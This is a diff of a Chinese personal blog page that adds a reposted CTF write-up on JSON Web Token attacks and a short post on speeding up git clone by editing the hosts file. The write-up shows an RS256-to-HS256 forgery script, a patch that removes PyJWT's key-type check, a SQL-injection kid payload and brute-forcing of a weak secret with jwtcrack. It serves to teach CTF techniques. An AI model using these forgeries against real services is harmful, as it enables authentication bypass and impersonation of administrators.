+<p>关注点2:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">getpubkey</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;hash&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现有一个存放公钥的目录</p>
+<p>所以立刻想到了json web token</p>
+<p>于是我抓包查看token<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5za3kiLCJwcml2Ijoib3RoZXIifQ.AoTc1q2NAErgqk6EeTK4MGH7cANVVF9XTy0wLv8HpgUfNcdM-etmv0Y9XmOuygF_ymV1rF6XQZzLrtkFqdMdP0NaZnTOYH35Yevaudx9bVpu9JHG4qeXo-<span class="number">0</span>TXBcpaPmBaM0V0GxyZRNIS2KwRkNaxAQDQnyTN-Yi3w8OVpJYBiI</span><br></pre></td></tr></table></figure></p>
+<p>使用<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>
+<p>得到3段：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"RS256"</span>,</span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"adminsky"</span>,</span><br><span class="line">  <span class="string">"priv"</span>: <span class="string">"other"</span></span><br><span class="line">&#125;</span><br><span class="line">signature</span><br></pre></td></tr></table></figure></p>
+<p>所以我的想法就是探测pubkey泄露，利用公私钥伪造json web token</p>
+<p>因为这个题的机制是私钥加密，公钥解密</p>
+<p>所以只要我们能拿到私钥，即可伪造json web token</p>
+<p>关注到格式<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">getpubkey</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;hash&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>天真的我尝试了<br>md5(username)<br>md5(salt.username)<br>md5(username.salt)</p>
+<p>其中salt试了无数，例如Bearer,bxs,rebirth</p>
+<p>都没有成功，心态崩了，暂且搁置</p>
+<p>后来得到提示<br>Web Pastebin /pubkey/md5(username+password)</p>
+<p>我才发现是username+password</p>
+<p>访问<br><a href="http://pastebin.bxsteam.xyz/pubkey/4eb8deaa574fdc8257e39b5dd4c6490e" target="_blank" rel="noopener">http://pastebin.bxsteam.xyz/pubkey/4eb8deaa574fdc8257e39b5dd4c6490e</a></p>
+<p>得到<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"pubkey"</span>:<span class="string">"-----BEGIN PUBLIC KEY-----nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCtRgwKdQFRKkXupJ8lHIXT/QTinmT9lobR6+1m4ubQXFaBlM7sJkzaoasPdU6e/5dJ5TelQSC59deolcXJ1iHf4/QmzndDX3L/ShtfPXZEGKkYCKC2kF0ekBz4W4LSQfaunZEz/yoScLqz9wOP8vwxAYN+P1nFtFrTzMdBYo8begEewIDAQABn-----END PUBLIC KEY-----"</span>,<span class="string">"result"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p>解析公钥<br>key长度：    1024<br>模数：    AD460C0A7501512A45EEA49F251C85D3FD04E2993F65A1B47AFB59B8B9B41715A06533BB099336A86AC3DD53A7BFE5D2794DE950482E7D75EA257172758877F8FD09B37435F72FF4A1B5F3D764418A91808A0B6905D1E901CF85B82D241F6AE9D9133FF2A1270BAB3F7038FF2FC3101837E3F516D16B4F331D058A3C6DE8047B<br>指数：    65537 (0x10001)</p>
+<p>本想尝试分解，但发现1024bit的n基本无解，所以私钥是不可能获取了，这个时候我的思路其实被灭杀了。</p>
+<p>因为没有私钥基本不能篡改json web token，毕竟无法通过消息验证码校验</p>
+<p>而这里就需要修改算法RS256为HS256（非对称密码算法 =&gt; 对称密码算法）</p>
+<p>算法HS256使用秘密密钥对每条消息进行签名和验证。</p>
+<p>算法RS256使用私钥对消息进行签名，并使用公钥进行验证。</p>
+<p>如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。</p>
+<p>由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。</p>
+<p>后端代码会使用RSA公钥+HS256算法进行签名验证。</p>
+<p>即更改算法为HS256，此时即不存在公钥私钥问题，因为对称密码算法只有一个key</p>
+<p>此时即我们可以任意访问的pubkey</p>
+<p>故此我立刻写出了构造脚本<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">public</span> = open(<span class="string">'1.txt'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">print jwt.encode(&#123;<span class="string">"name"</span>: <span class="string">"adminsky"</span>,<span class="string">"priv"</span>: <span class="string">"admin"</span>&#125;, key=<span class="keyword">public</span>, algorithm=<span class="string">'HS256'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>注：1.txt为公钥</p>
+<p>priv为admin，因为之前为other，即其他人，同时只有admin可以读flag，所以这里猜测为admin</p>
+<p>运行发现报错：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">File <span class="string">"G:python2.7libsite-packagesjwtalgorithms.py"</span>, line <span class="number">151</span>, in prepare_key</span><br><span class="line">    <span class="string">'The specified key is an asymmetric key or x509 certificate and'</span></span><br><span class="line">jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</span><br></pre></td></tr></table></figure></p>
+<p>发现源码的第151行爆破了，于是去跟踪库的源码</p>
+<p>发现<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">prepare_key</span><span class="params">(self, key)</span>:</span></span><br><span class="line"><span class="function">        key </span>= force_bytes(key)</span><br><span class="line"></span><br><span class="line">        invalid_strings = [</span><br><span class="line">            b<span class="string">'-----BEGIN PUBLIC KEY-----'</span>,</span><br><span class="line">            b<span class="string">'-----BEGIN CERTIFICATE-----'</span>,</span><br><span class="line">            b<span class="string">'-----BEGIN RSA PUBLIC KEY-----'</span>,</span><br><span class="line">            b<span class="string">'ssh-rsa'</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">if</span> <span class="title">any</span><span class="params">([string_value in key <span class="keyword">for</span> string_value in invalid_strings])</span>:</span></span><br><span class="line"><span class="function">            raise <span class="title">InvalidKeyError</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="string">'The specified key is an asymmetric key or x509 certificate and'</span></span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="string">' should not be used as an HMAC secret.'</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        return key</span></span><br></pre></td></tr></table></figure></p>
+<p>prepare_key会判断是否有非法字符，简单粗暴的注释掉<br>def prepare_key(self, key):<br>        key = force_bytes(key)<br>        return key</p>
+<p>保存后再运行得到<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5za3kiLCJwcml2IjoiYWRtaW4ifQ.zc8m-ymnOrwuvd2kdsKMBVrT_9JXPXHkFf4vcPWecqI</span><br></pre></td></tr></table></figure></p>
+<p>然后利用这个去访问list</p>
+<p>即可得到admin的消息<br><img src="https://img-blog.csdnimg.cn/2019051621563087.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>admin:4fd5988f73c7a414f4c947e9fd708811</p>
+<p>访问<br><a href="http://pastebin.bxsteam.xyz/text/admin:4fd5988f73c7a414f4c947e9fd708811" target="_blank" rel="noopener">http://pastebin.bxsteam.xyz/text/admin:4fd5988f73c7a414f4c947e9fd708811</a></p>
+<p>得到flag<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"content"</span>:<span class="string">"cumtctf&#123;jwt_is_not_safe_too_much&#125;"</span>,<span class="string">"result"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p>至此，我们成功用修改算法攻击(非对称密码 =&gt; 对称密码)破解了此题</p>
+<p>密钥可控问题<br>题目1：</p>
+<p>在国赛中，我遇到了这样的JWT:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiI4MjAxIn0.eyJuYW1lIjoiYWRtaW4yMzMzIn0.aC0DlfB3pbeIqAQ18PaaTOPA5PSipJe651w7E0BZZRI</span><br><span class="line"></span><br><span class="line">header头：</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"typ"</span>:<span class="string">"JWT"</span>,</span><br><span class="line">    <span class="string">"alg"</span>:<span class="string">"sha256"</span>,</span><br><span class="line">    <span class="string">"kid"</span>:<span class="string">"8201"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中kid为密钥key的编号id</p>
+<p>类似逻辑为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql=<span class="string">"select * from table where kid=$kid"</span></span><br></pre></td></tr></table></figure></p>
+<p>这样查询出来的值即为key的值</p>
+<p>但是如果我们在这里进行恶意篡改，例如<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kid = <span class="number">0</span> union select <span class="number">12345</span></span><br></pre></td></tr></table></figure></p>
+<p>这样查询出来的结果必然为12345</p>
+<p>这样等同于我们控制了密钥key</p>
+<p>拥有了密钥key，那么即可任意伪造消息，达到成为admin登入的目的了<br>题目2：</p>
+<p>同样在HITB 2017中也存在一道这样可控密钥的题目</p>
+<p>这里的详情可以在最后的参考链接中查看，这里我简要叙述一下</p>
+<p>首先header中同样存在kid可控问题<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"kid"</span>:<span class="string">"keys/3c3c2ea1c3f113f649dc9389dd71b851"</span>,</span><br><span class="line">    <span class="string">"typ"</span>:<span class="string">"JWT"</span>,</span><br><span class="line">    <span class="string">"alg"</span>:<span class="string">"RS256"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>并且题目存在写消息保存于本地的功能</p>
+<p>于是最后可以自己写公钥，保存于服务器</p>
+<p>利用kid可控的路径去加载自己写的公钥</p>
+<p>然后用相应的私钥去篡改信息，伪造admin，利用我们自己写的公钥进行验证</p>
+<p>密钥爆破问题<br>我们知道在HS签名算法中，只有一个密钥</p>
+<p>如果这个密钥的复杂度不够，或者为弱口令</p>
+<p>那么很容易导致攻击者轻松的破解，达到篡改消息，伪造身份的目的</p>
+<p>破解工具也有现成的：<br><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a></p>
+<p>使用方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br></pre></td></tr></table></figure></p>
+<p>即可得到密钥：Sn1f</p>
+<p>然后即可进行消息的恶意伪造，篡改</p>
+<p>参考链接<br><a href="https://jwt.io" target="_blank" rel="noopener">https://jwt.io</a><br><a href="https://www.jianshu.com/p/e64d96b4a54d" target="_blank" rel="noopener">https://www.jianshu.com/p/e64d96b4a54d</a><br><a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/</a><br><a href="https://delcoding.github.io/2018/03/jwt-bypass/" target="_blank" rel="noopener">https://delcoding.github.io/2018/03/jwt-bypass/</a><br><a href="http://www.cnblogs.com/dliv3/p/7450057.html" target="_blank" rel="noopener">http://www.cnblogs.com/dliv3/p/7450057.html</a></p>
+<p>转载自：<a href="https://www.anquanke.com/post/id/145540" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145540</a></p>
 
       
     </div>
@@ -186,7 +212,7 @@
         
   
   <div class="tags">
-    <a href="/xikong-mubai.github.io/tags/CTF/">CTF</a>
+    <a href="/xikong-mubai.github.io/tags/CTF/">CTF</a>, <a href="/xikong-mubai.github.io/tags/web/">web</a>
   </div>
 
         <!-- partial('post/share') -->
@@ -239,11 +265,57 @@
 
 
 
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2019-04-20T16:45:18.269Z"><a href="/xikong-mubai.github.io/2019/04/21/git clone下载慢/">2019-04-21</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/xikong-mubai.github.io/2019/04/21/git clone下载慢/">git clone下载慢解决</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>标签（空格分隔）：代码学习</p>
+<hr>
+<p>git clone命令下载文件时特别慢基本只有几kb每秒，要解决这个问题感觉和上p站原理类似，应该都是因为访问外网的原因<br>修改hosts，直接让计算机访问其IP<br>搜了下大佬的方案，发现确实是dns解析的问题。所以直接添加github的ip地址到hosts文件：<br>在其中增加：</p>
+<pre><code>151.101.72.249 github.global.ssl.fastly.net  
+13.250.177.223 github.com
+</code></pre><p>然后重启网络服务即可：</p>
+<pre><code>ipconfig /flushdns
+</code></pre><p>然而，需要注意的是，github的ip地址有可能会变更，所以，我们有时需要重新更新github的ip地址。<br><code>github.global.ssl.fastly.net</code> 的ip地址可以通过<code>ping</code>来获得，而<code>github.com</code>因为把<code>ping</code>命令给禁用掉了，需要使用 <code>IPAddress.com</code> 或者 <code>http://tool.chinaz.com</code> 来得到<code>github.com</code>的ip地址，然后把这两个获得的地址更新到dns缓存即可。</p>
+<h2 id="我查github-com的IP时发现有好几个，就全保存了"><a href="#我查github-com的IP时发现有好几个，就全保存了" class="headerlink" title="我查github.com的IP时发现有好几个，就全保存了"></a>我查<code>github.com</code>的IP时发现有好几个，就全保存了</h2><p>来源：CSDN<br>参考链接：<a href="https://blog.csdn.net/vincentuva/article/details/84195775" target="_blank" rel="noopener">https://blog.csdn.net/vincentuva/article/details/84195775</a> </p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
 
 <nav id="pagination">
   
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/xikong-mubai.github.io/page/7/">&laquo; Prev</a><a class="page-number" href="/xikong-mubai.github.io/">1</a><span class="space">&hellip;</span><a class="page-number" href="/xikong-mubai.github.io/page/6/">6</a><a class="page-number" href="/xikong-mubai.github.io/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/xikong-mubai.github.io/page/9/">9</a><a class="page-number" href="/xikong-mubai.github.io/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/xikong-mubai.github.io/page/12/">12</a><a class="extend next" rel="next" href="/xikong-mubai.github.io/page/9/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/xikong-mubai.github.io/page/7/">&laquo; Prev</a><a class="page-number" href="/xikong-mubai.github.io/">1</a><span class="space">&hellip;</span><a class="page-number" href="/xikong-mubai.github.io/page/6/">6</a><a class="page-number" href="/xikong-mubai.github.io/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/xikong-mubai.github.io/page/9/">9</a><a class="page-number" href="/xikong-mubai.github.io/page/10/">10</a><a class="page-number" href="/xikong-mubai.github.io/page/11/">11</a><a class="extend next" rel="next" href="/xikong-mubai.github.io/page/9/">Next &raquo;</a>
   </nav>
 
 </nav>
@@ -264,23 +336,23 @@
   <ul class="entry">
     
       <li>
-        <a href="/xikong-mubai.github.io/2019/11/08/ISCC 2019 writeup/"></a>
-      </li>
-    
-      <li>
-        <a href="/xikong-mubai.github.io/2019/11/08/（复杂SQLselect语句）带text数据的group by命令——小白（萌新）篇/"></a>
-      </li>
-    
-      <li>
-        <a href="/xikong-mubai.github.io/2019/11/08/(json web token)JWT攻击/"></a>
-      </li>
-    
-      <li>
-        <a href="/xikong-mubai.github.io/2019/11/08/python-pycrypto的完全版安装/"></a>
-      </li>
-    
-      <li>
         <a href="/xikong-mubai.github.io/2019/11/08/ctf编码加解密总结 - 简书_files/webpack-78261ba1a8892c85ff12/"></a>
+      </li>
+    
+      <li>
+        <a href="/xikong-mubai.github.io/2019/11/08/ctf编码加解密总结 - 简书_files/styles/"></a>
+      </li>
+    
+      <li>
+        <a href="/xikong-mubai.github.io/2019/11/08/ctf编码加解密总结 - 简书_files/styles/"></a>
+      </li>
+    
+      <li>
+        <a href="/xikong-mubai.github.io/2019/11/08/ctf编码加解密总结 - 简书_files/slug/"></a>
+      </li>
+    
+      <li>
+        <a href="/xikong-mubai.github.io/2019/11/08/ctf编码加解密总结 - 简书_files/main-31fa506157e74ba5539a/"></a>
       </li>
     
   </ul>
@@ -292,7 +364,21 @@
   <h3 class="title">Tags</h3>
   <ul class="entry">
   
-    <li><a href="/xikong-mubai.github.io/tags/CTF/">CTF</a><small>1</small></li>
+    <li><a href="/xikong-mubai.github.io/tags/CTF/">CTF</a><small>4</small></li>
+  
+    <li><a href="/xikong-mubai.github.io/tags/SQL/">SQL</a><small>1</small></li>
+  
+    <li><a href="/xikong-mubai.github.io/tags/crypto/">crypto</a><small>1</small></li>
+  
+    <li><a href="/xikong-mubai.github.io/tags/kali/">kali</a><small>1</small></li>
+  
+    <li><a href="/xikong-mubai.github.io/tags/pwn/">pwn</a><small>1</small></li>
+  
+    <li><a href="/xikong-mubai.github.io/tags/python/">python</a><small>2</small></li>
+  
+    <li><a href="/xikong-mubai.github.io/tags/web/">web</a><small>1</small></li>
+  
+    <li><a href="/xikong-mubai.github.io/tags/随笔/">随笔</a><small>2</small></li>
   
   </ul>
 </div>
@@ -302,7 +388,7 @@
 <div class="widget tagcloud">
   <h3 class="title">Tag Cloud</h3>
   <div class="entry">
-    <a href="/xikong-mubai.github.io/tags/CTF/" style="font-size: 10px;">CTF</a>
+    <a href="/xikong-mubai.github.io/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/xikong-mubai.github.io/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/xikong-mubai.github.io/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/xikong-mubai.github.io/tags/kali/" style="font-size: 10px;">kali</a> <a href="/xikong-mubai.github.io/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/xikong-mubai.github.io/tags/python/" style="font-size: 15px;">python</a> <a href="/xikong-mubai.github.io/tags/web/" style="font-size: 10px;">web</a> <a href="/xikong-mubai.github.io/tags/随笔/" style="font-size: 15px;">随笔</a>
   </div>
 </div>
 
